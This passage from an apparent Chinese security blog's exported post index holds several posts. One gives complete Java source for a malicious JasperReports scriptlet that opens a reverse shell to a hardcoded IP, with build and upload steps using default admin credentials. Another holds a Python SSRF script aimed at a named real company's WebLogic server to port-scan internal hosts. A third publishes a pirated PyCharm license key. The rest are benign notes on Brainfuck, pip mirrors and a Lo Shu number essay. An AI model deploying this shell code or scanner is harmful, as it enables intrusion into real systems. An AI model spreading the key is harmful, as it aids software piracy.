isPrintWhenDetailOverflows="true" backcolor="#C0C0C0" uuid="aeafecc2-ef7e-435c-ae07-1f45ed6b179a"/&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid"/&gt;&lt;/box&gt;&lt;textElement textAlignment="Left"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;anchorNameExpression&gt;&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;&lt;/anchorNameExpression&gt;&lt;/textField&gt;&lt;/jr:cell&gt;&lt;/jr:groupHeader&gt;&lt;jr:column width="30" uuid="43ffff20-e89f-4f73-ad8d-878e9581274a"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="30" height="16" isPrintWhenDetailOverflows="true" uuid="a76dcb9c-8601-48bc-b9cc-3d1c316e537d"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.colspan" value="1"/&gt;&lt;/reportElement&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" "]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="30" height="20" isPrintWhenDetailOverflows="true" uuid="73a40f28-2c08-4849-a2a9-b83ade7a6b7d"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="10"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textElement textAlignment="Right"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="240" uuid="d472eeed-282a-402b-9044-a397ca270655"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="240" height="16" isPrintWhenDetailOverflows="true" uuid="bd0d4582-5684-4e15-8623-b3f1940bf1bb"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.colspan" value="2"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Name"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell style="detail" height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="240" height="20" isPrintWhenDetailOverflows="true" uuid="23562605-5611-41d8-8a40-98ad9d28834a"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="5"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;name&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="100" uuid="4612e5a3-cb0d-4533-9b54-9ad9828acbed"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="100" height="16" isPrintWhenDetailOverflows="true" uuid="d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="10" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Phone"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="100" height="20" isPrintWhenDetailOverflows="true" uuid="e48d7dee-a092-45ea-8bd8-8440f76a9fd0"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="5"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="145" uuid="f0397b7d-4130-4b13-88b1-d89415b269bd"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="145" height="16" isPrintWhenDetailOverflows="true" uuid="0a1206b8-d0d6-4809-a424-3d7f09606b44"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Address"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="145" height="20" isPrintWhenDetailOverflows="true" uuid="7bc63c7e-0224-441b-96ec-8a1bb67a0b84"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="0"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;/jr:columnGroup&gt;&lt;/jr:table&gt;&lt;/componentElement&gt;&lt;/band&gt;&lt;/summary&gt;&lt;/jasperReport&gt;接下来看42行：&lt;textFieldExpression&gt;&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;&lt;/textFieldExpression&gt;这里我们调用一个getshell的方法在ShellScriptlet_SCRIPTLET。在35行我们定义了一个ShellScriptlet_SCRIPTLET 来引用“foxglove.shell.ShellScriptlet”中的Java代码。&lt;scriptlet name="ShellScriptlet" class="foxglove.shell.ShellScriptlet"&gt;&lt;scriptletDescription&gt;&lt;![CDATA[]]&gt;&lt;/scriptletDescription&gt;&lt;/scriptlet&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101这很简单,但这在Java代码本身是如何定义的呢?编写攻击脚本scriptlet用Java编写,需要去扩展“JRDefaultScriptlet”。我从"here"中借用了一些Java代码来反弹shell并且让这种攻击脚本成为跨平台的。下面就是结果了，要注意“host”和“port”的写法是固定的：package foxglove.shell;import java.io.*;import java.net.*;import java.io.InputStream;import java.io.OutputStream;import java.io.DataInputStream;import net.sf.jasperreports.engine.JRDefaultScriptlet;import net.sf.jasperreports.engine.JRScriptletException; public class ShellScriptlet extends JRDefaultScriptlet implements Runnable&#123; Socket socket; PrintWriter socketWrite; BufferedReader socketRead; PrintWriter commandWrite; BufferedReader commandRead; static String ip; int port = 8080; public String getShell()&#123; ip = "1.1.1.1"; ShellScriptlet shell = new ShellScriptlet(); shell.establishConnection(); new Thread(shell).start(); shell.getCommand(); return "DONE"; &#125; public void run()&#123; spawnShell(); &#125; public void spawnShell()&#123; boolean windows = false; try&#123; if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)&#123; windows = true; &#125; Runtime rt = Runtime.getRuntime(); Process p; if(windows) p = rt.exec("C:\\Windows\\System32\\cmd.exe"); else p = rt.exec("/bin/sh"); InputStream readme = p.getInputStream(); OutputStream writeme = p.getOutputStream(); commandWrite = new PrintWriter(writeme); commandRead = new BufferedReader(new InputStreamReader(readme)); if(windows) commandWrite.println("dir"); else commandWrite.println("ls -al"); commandWrite.flush(); String line; while((line = commandRead.readLine()) != null)&#123; socketWrite.println(line); socketWrite.flush(); &#125; p.destroy(); &#125;catch(Exception e)&#123;&#125; &#125; public void establishConnection()&#123; try&#123; socket = new Socket(ip,port); socketWrite = new PrintWriter(socket.getOutputStream(),true); socketRead = new BufferedReader(new InputStreamReader(socket.getInputStream())); socketWrite.println("---Connection has been established---"); socketWrite.flush(); &#125;catch(Exception e)&#123;&#125; &#125; public void getCommand()&#123; String foo; try&#123; while((foo=socketRead.readLine())!= null)&#123; commandWrite.println(foo); commandWrite.flush(); &#125; &#125;catch(Exception e)&#123;&#125; &#125; public static void main(String args[])&#123; ShellScriptlet r = new ShellScriptlet(); r.getShell(); &#125;&#125; 对于那些不熟悉Java的,你可以用下面的命令编译在相同的目录中 1/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d . 这里指定” javac “的完整路径是有原因的(这是Java 1.6)。如果你运行这个命令对某种系统会出错,你需要考虑理想情况下用相同的环境来编译它，至少不是最新的版本！ 接下来我们要做的就是把所有的代码打包趁有个jar文件然后上传到目标站点。你可以使用下面这个代码来完成它： 1/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/ 如果一切进行的顺利，你就会得到个“shell.jar”文件，接下来就准备上传这个到目标站点吧！ 部署这个新的“Report”每个版本的JasperReports似乎都有些不同，但是他们都有相同的函数和工作流。 首先很明显我们要去验证一下“jasperadmin/jasperadmin”： 在我这个版本中，这就立即显示出了有一堆reports样例的“Repository”（要确保“Type”这一列说的是“Report”）。 接下来，我们只要右击一个report并且点击“Edit”就好。 一开始，就点击 “Controls and Resources” 之后点击“Add Resource”。上传我们之前创建的JAR文件并给这个资源命名为“ShellScriptlet”。结束之后我们应该可以看到下图这样的结果： 点击左侧栏的“Set Up”，单击 “Upload a Local file”把我们之前创建的JRXML文件上传了。你应该可以得到下图所示的结果： Jasper 现在让我们去定义一些我们在JRXML文件引用的资源。如果你是一个keener你可能会仅仅把这些资源从JRXML文件中删除。仅仅单击“Add Now”并且上传一些随机的PNG图片文件为你每一个引用资源…当你做完这些应该看起来像下图一样： 现在你只需要点击“Submit”在这个按钮来创建我们的恶意report就好了。哈哈 Shellz!先别激动，在你运行这个report之前，你还要开个监听端口去捕捉你的shell！！！ 之后单击你创建的report，它将会运行Java代码，如果没有什么问题，你就可以看到反弹的shell了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[洛书中的数字规律]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%B4%9B%E4%B9%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%A7%84%E5%BE%8B%2F</url>
      <content type="text"><![CDATA[数字规律编辑 那么河图洛书中真的隐含着宇宙之理吗？其内容又是什么呢？我在这里只能先谈洛书，即九宫图。把九宫图中的数字排列来进行详解一番，或可看出一定道理来。首先在九宫图中数字之和等于十五，这一点恐怕所有的人都知道，就是横坚斜相加都等于十五。 4+9+2=15 3+5+7=15 8+1+6=15 4+3+8=15 9+5+1=15 2+7+6=15 4+5+6=15 2+5+8=15 除此之外，还有什么数字玄机呢？ a+b+c=d+e+f a^2+b^2+c^2=d^2+e^2+f^2 我们以左列的438与右列的276为例加以说明。当我们把数递变为两位数相加时，左右两列数字之和依然相等。即43+38+84=27+76+62。从下向上递变依然成立。即83+34+48=67+72+26。 递变为三位数依然相等，即438+384+843=276+762+627。 从下向上递数依然成立，即834+348+483=672+726+267。 再这样递变下去为四位数、五位数、六位数，一百位数、一千位数依然成立。神奇之处还不在这里，更为神奇的是不管是一位，还是两位数三位数的平方相加和依然可以左右相等。比如两位数即43^2+38^2+84^2=27^2+76^2+62^2。 三位数四位数平方和依然可以成立。也就是说一百位也好一千位也好都可以成立。这个数字的神奇排列真是让我莫名惊诧。 再有就是把九宫图用行列式的方法计算，可以得到一个周天数360。在这些数字面前，我不敢想象，这样一个数字排竟然有着不可思议的魔力。 det[4 ，9， 2；3，5，7；8，1，6]=360 就是这样的一个九宫数的排列解开了美国数学家提出的数学怪题，严格等平方和的问题，当时可是无人能解的数学怪题，就连计算机都无能为力。结果被研究洛书的彭绍定数学教授攻克。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Brainfuck]]></title>
      <url>%2F2017%2F01%2F22%2FBrainfuck%2F</url>
      <content type="text"><![CDATA[一些隐写题中可能会出此现这种东西，下面我来大概介绍一下： 官方网站: http://www.muppetlabs.com/~breadbox/bf/ BrainFuck, (An Eight-Instruction Turing-Complete Programming Language), 这个语言本身的语言模型很简单, 有一个byte指针, 有一个初始化为0长度为30000 bytes的数组, byte指针可以在数组内任意移动, 支持下面的八种操作, 指针初始化指向数组的开始. 这个语言只是作者为了写一个很简单的编译器, 才设计的一门语言, 语言和名字一样, 很难读懂, 简单的一些操作用BrainFuck来写都很复杂难读. 八种操作符定义如下: 字符 含义 &gt; 指针加一 &lt; 指针减一 + 指针指向的字节的值加一 - 指针指向的字节的值减一 . 输出指针指向的单元内容（ASCII码） , 输入内容到指针指向的单元（ASCII码） [ 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ] 如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 Brainfuck程序可以用下面的替换方法翻译成C语言(假设ptr是char*类型)： Brainfuck C &gt; ++ptr; &lt; –ptr; + ++*ptr; - –*ptr; . putchar(*ptr); , *ptr =getchar(); [ while (*ptr) { ] } 举个例子： ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++.&gt;+.+++++++..+++.&lt;&lt;++.&gt;+++++++++++++++.&gt;.+++.------.--------.&lt;&lt;+.&lt;. 这个编译后就是 ‘Hello World!’ 其实只要工具就好了！！！贴一个python实现的解释器： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import os import sys def mainloop(program, bracket_map): pc = 0 tape = Tape() while pc &lt; len(program): code = program[pc] if code == "&gt;": tape.advance() elif code == "&lt;": tape.devance() elif code == "+": tape.inc() elif code == "-": tape.dec() elif code == ".": # print os.write(1, chr(tape.get())) elif code == ",": # read from stdin tape.set(ord(os.read(0, 1)[0])) elif code == "[" and tape.get() == 0: # Skip forward to the matching ] pc = bracket_map[pc] elif code == "]" and tape.get() != 0: # Skip back to the matching [ pc = bracket_map[pc] pc += 1 class Tape(object): def __init__(self): self.thetape = [0] self.position = 0 def get(self): return self.thetape[self.position] def set(self, val): self.thetape[self.position] = val def inc(self): self.thetape[self.position] += 1 def dec(self): self.thetape[self.position] -= 1 def advance(self): self.position += 1 if len(self.thetape) &lt;= self.position: self.thetape.append(0) def devance(self): self.position -= 1 def parse(program): parsed = [] bracket_map = &#123;&#125; leftstack = [] pc = 0 for char in program: if char in ('[', ']', '&lt;', '&gt;', '+', '-', ',', '.'): parsed.append(char) if char == '[': leftstack.append(pc) elif char == ']': left = leftstack.pop() right = pc bracket_map[left] = right bracket_map[right] = left pc += 1 return "".join(parsed), bracket_map def run(fp): program_contents = "" while True: read = os.read(fp, 4096) if len(read) == 0: break program_contents += read os.close(fp) program, bm = parse(program_contents) mainloop(program, bm) if __name__ == '__main__': run(os.open(sys.argv[1], os.O_RDONLY, 0777))#用法：python brain.py flag.br#在.br文件中保存BrainFuck的代码 c编写的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950include &lt;stdio.h&gt;;int p, r, q;char a[5000], f[5000], b, o, *s=f;void interpret(char *c)&#123; char *d; r++; while( *c ) &#123; switch(o=1,*c++) &#123; case '&lt;': p--; break; case '&gt;': p++; break; case '+': a[p]++; break; case '-': a[p]--; break; case '.': putchar(a[p]); fflush(stdout); break; case ',': a[p]=getchar();fflush(stdout); break; case '[': for( b=1,d=c; b &amp;&amp; *c; c++ ) b+=*c=='[', b-=*c==']'; if(!b) &#123; c[-1]=0; while( a[p] ) interpret(d); c[-1]=']'; break; &#125; case ']': puts("UNBALANCED BRACKETS"), exit(0); case '#': if(q&gt;2) printf("%2d %2d %2d %2d %2d %2d %2d %2d %2d %2d/n%*s/n", *a,a[1],a[2],a[3],a[4],a[5],a[6],a[7],a[8],a[9],3*p+2,"^"); break; default: o=0; &#125; if( p&lt;0 || p&gt;100) puts("RANGE ERROR"), exit(0); &#125; r--;&#125;void main(int argc,char *argv[])&#123; FILE *z; q=argc; if(z=fopen(argv[1],"r")) &#123; while( (b=getc(z))&gt;0 ) *s++=b; *s=0; interpret(f); &#125;&#125; 编译一下就可以用了。 嗯，就这些。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win7使用wget]]></title>
      <url>%2F2017%2F01%2F22%2Fwin7%E4%BD%BF%E7%94%A8wget%2F</url>
      <content type="text"><![CDATA[一、下载官网：http://gnuwin32.sourceforge.net/packages/wget.htm 下载地址：http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe 二、安装与系统环境变量配置2.1 安装双击一步步安装即可 2.2 配置系统环境变量在“Path”变量中添加：;E:\DevTools\GnuWin32\bin]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PyCharm2016.2专业版注册码]]></title>
      <url>%2F2017%2F01%2F22%2FPyCharm2016-2%E4%B8%93%E4%B8%9A%E7%89%88%E6%B3%A8%E5%86%8C%E7%A0%81%2F</url>
      <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353643B4A73YYJ-eyJsaWNlbnNlSWQiOiI0M0I0QTczWVlKIiwibGljZW5zZWVOYW1lIjoibGFuIHl1IiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IkZvciBlZHVjYXRpb25hbCB1c2Ugb25seSIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJwYWlkVXBUbyI6IjIwMTctMDItMjUifSx7ImNvZGUiOiJBQyIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9LHsiY29kZSI6IkRQTiIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDE3LTAyLTI1In0seyJjb2RlIjoiRE0iLCJwYWlkVXBUbyI6IjIwMTctMDItMjUifSx7ImNvZGUiOiJDTCIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9LHsiY29kZSI6IlJTMCIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9LHsiY29kZSI6IlJDIiwicGFpZFVwVG8iOiIyMDE3LTAyLTI1In0seyJjb2RlIjoiUEMiLCJwYWlkVXBUbyI6IjIwMTctMDItMjUifSx7ImNvZGUiOiJSTSIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9LHsiY29kZSI6IldTIiwicGFpZFVwVG8iOiIyMDE3LTAyLTI1In0seyJjb2RlIjoiREIiLCJwYWlkVXBUbyI6IjIwMTctMDItMjUifSx7ImNvZGUiOiJEQyIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9XSwiaGFzaCI6IjMzOTgyOTkvMCIsImdyYWNlUGVyaW9kRGF5cyI6MCwiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-keaxIkRgXPKE4BR/ZTs7s7UkP92LBxRe57HvWamu1EHVXTcV1B4f/KNQIrpOpN6dgpjig5eMVMPmo7yMPl+bmwQ8pTZaCGFuLqCHD1ngo6ywHKIQy0nR249sAUVaCl2wGJwaO4JeOh1opUx8chzSBVRZBMz0/MGyygi7duYAff9JQqfH3p/BhDTNM8eKl6z5tnneZ8ZG5bG1XvqFTqWk4FhGsEWdK7B+He44hPjBxKQl2gmZAodb6g9YxfTHhVRKQY5hQ7KPXNvh3ikerHkoaL5apgsVBZJOTDE2KdYTnGLmqxghFx6L0ofqKI6hMr48ergMyflDk6wLNGWJvYHLWw==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux下使用锐捷的方法]]></title>
      <url>%2F2017%2F01%2F22%2FLinux%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%94%90%E6%8D%B7%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[其实很简单一个命令就搞定（前提是你有这个脚本） 12345678910111213#下载之后先解压：unzip RuijieForLinux.zip#之后cd 进去#在然后呢sudo chmod +x ./rjsupplicant.sh#再然后呢sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源 第一次使用时，可以通过 –help命令查看使用帮助文档 贴个效果图：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Weblogic_SSRF]]></title>
      <url>%2F2017%2F01%2F22%2FWeblogic-SSRF%2F</url>
      <content type="text"><![CDATA[Weblogic_SSRF的一个利用脚本 123456789101112131415161718192021222324252627282930313233343536373839import sysimport requestsdef scan(ip_str):#元组ports = ('21','22','23','53','80','135','139','443','445','1080','1433','1521','3306','3389','4899','8080','7001','8000',)for port in ports:# %d 是整形通配符,%s是字符串通配符exp_url = "http://www.faw.com.cn/uddiexplorer/SetupUDDIExplorer.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"%(ip_str,port)try:response = requests.get(exp_url, timeout=1, verify=False)if response.status_code == 200 and 'weblogic.uddi.client.structures.exception.XML_SoapException' in response.content:print ip_str+':' + port + ' --open'except Exception, e:passdef find_ip(ip_prefix):for i in range(190,200):scan('%s.%s'%(ip_prefix,i))if __name__ == "__main__":commandargs = sys.argv[1]args = "".join(commandargs)#将列表数据以‘’中的字符链接ip_prefix = '.'.join(args.split('.')[:-1])find_ip(ip_prefix)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[RSS阅读器]]></title>
      <url>%2F2017%2F01%2F22%2FRSS%E9%98%85%E8%AF%BB%E5%99%A8%2F</url>
      <content type="text"><![CDATA[推荐两个个RSS阅读器，免费的。用了好久，很不错。 1.http://azreader.net/ 2.深蓝阅读]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CTF中那些有趣的混淆]]></title>
      <url>%2F2017%2F01%2F22%2FCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E6%B7%86%2F</url>
      <content type="text"><![CDATA[​ ppencode/rrencode/jjencode/aaencode是Perl、Ruby、Javascript的小工具，可以将各自的代码进行混淆，转换成特殊字符，甚至还可以转换成有意思的表情。 ppencode-Perl台湾的Perl达人唐鳳在YAPC曾经介绍过ppencode，它可以把Perl代码转换成只有英文字母的字符串。 下面是转换示例： Demo的地址：http://namazu.org/~takesako/ppencode/demo.html。 rrencode-Rubyrrencode可以把ruby代码全部转换成符号。 下面是转换示例： 项目地址：http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html。 jjencode/aaencode-Javascriptjjencode和aaencode都是Yosuke HASEGAWA的作品，前者将JS代码转换成只有符号的字符串，类似于rrencode，介绍的PPT见http://utf-8.jp/public/20090710/jjencode.pps。 后者更好玩，可以将JS代码转换成常用的网络表情，例如“(ﾟΘﾟ)”。示例如下： Demo的地址是：http://utf-8.jp/public/aaencode.html，转换的代码并不复杂，可以在源代码里看到。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pip源的修改]]></title>
      <url>%2F2017%2F01%2F22%2Fpip%E6%BA%90%E7%9A%84%E4%BF%AE%E6%94%B9%2F</url>
      <content type="text"><![CDATA[1:在windows环境下修改pip镜像源的方法(以python3.5为例):(1):在windows文件管理器中,输入 %APPDATA% (2):会定位到一个新的目录下，在该目录下新建pip文件夹，然后到pip文件夹里面去新建个pip.ini文 (3):在新建的pip.ini文件中输入以下内容，搞定 1234[global]timeout = 6000index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com 2：在linux系统中更新pip源的方式(以centos,python2.7为例)在linux环境下的修改方式和在windows环境下修改方式基本相同，这里简单总结一下: (1):在用户的家目录下面创建名为.pip文件夹 (2):在创建好的.pip文件夹中创建名为pip.conf的文件 (3):在pip.conf文件中输入以下内容，ok!!! 1234[global]timeout = 6000index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com 3：macOS更改pip源在终端进入目录：cd ~/ 如果没有 .pip 文件夹，那么就要新建这个文件夹，mkdir .pip 然后在.pip 文件夹内vim pip.conf， 写入阿里云 1234567[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 或者可以使用豆瓣的镜像： 1234567[global]index-url = http://pypi.douban.com/simple[install]trusted-host=pypi.douban.com 好了现在你可以体验快的飞起的pip了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[你会用你的虚拟机吗?(一)]]></title>
      <url>%2F2017%2F01%2F22%2F%E4%BD%A0%E4%BC%9A%E7%94%A8%E4%BD%A0%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%97-%E4%B8%80%2F</url>
